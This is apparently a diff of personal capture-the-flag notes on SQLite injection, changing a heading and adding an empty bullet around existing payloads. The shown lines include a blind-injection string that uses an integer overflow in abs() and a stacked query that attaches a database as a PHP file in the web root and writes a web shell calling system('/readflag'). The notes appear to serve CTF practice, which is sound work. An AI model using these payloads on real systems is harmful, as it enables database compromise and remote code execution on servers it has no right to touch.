@@ -1,4 +1,4 @@
-- # sqlite
+# sqlite
 	- [参考](https://www.sjkjc.com/sqlite-ref/string-functions/)
 	- ```
 	  a'||1=2||abs(case(2)when(1)then(1)else(0x8000000000000000)end)||'
@@ -13,3 +13,4 @@
 		- ```
 		  1; ATTACH DATABASE '/var/www/html/data/qazxsw.php' as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES ('<?php echo system(\"/readflag\"); ?>'); -- xyz
 		  ```
+	-
